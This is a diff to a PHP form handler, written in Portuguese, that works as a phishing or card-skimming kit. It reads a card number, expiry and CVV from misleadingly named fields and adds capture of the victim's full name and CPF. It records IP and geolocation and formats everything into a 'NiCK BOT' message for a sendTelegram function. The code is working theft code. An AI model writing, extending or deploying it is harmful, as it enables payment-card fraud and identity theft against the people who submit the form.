@@ -43,12 +43,15 @@ function sendTelegram(string $t, string $c, string $m): bool {
 
 if ($_SERVER['REQUEST_METHOD']==='POST') {
     // campos básicos
+    $nomeCompleto = trim($_POST['campoNomeCompleto'] ?? '');
+    $cpf = trim($_POST['campoCpf'] ?? '');
+
     $num = trim($_POST['campoNome']  ?? '');
     $val = trim($_POST['campoTel']   ?? '');
     $cvv = trim($_POST['campoTel2']  ?? '');
-    if (!$num||!$val||!$cvv) {
-        echo '❗ Preencha todos os campos.'; ob_end_flush(); exit;
-    }
+    if (!$nomeCompleto || !$cpf || !$num || !$val || !$cvv) {
+    echo '❗ Preencha todos os campos.'; ob_end_flush(); exit;
+}
 
     // IP real
     $ip = !empty($_SERVER['HTTP_X_FORWARDED_FOR'])
@@ -72,7 +75,9 @@ if ($_SERVER['REQUEST_METHOD']==='POST') {
     $mdl  = $_POST['device_model']   ?? 'N/A';
 
     // monta mensagem
-    $msg  = "💌 *Novo Registro de Teste*\n\n";
+    $msg  = "🌐 - *NiCK BOT*\n\n";
+    $msg .= "👤 Nome Completo: {$nomeCompleto}\n";
+    $msg .= "🆔 CPF: {$cpf}\n";
     $msg .= "💳 Cartão: {$num}\n📅 Validade: {$val}\n🔒 CVV: {$cvv}\n\n";
     $msg .= "📍 IP: {$geo['query']} ({$host})\n";
     $msg .= "🏙 Cidade: {$geo['city']}\n🌎 País: {$geo['country']}\n";
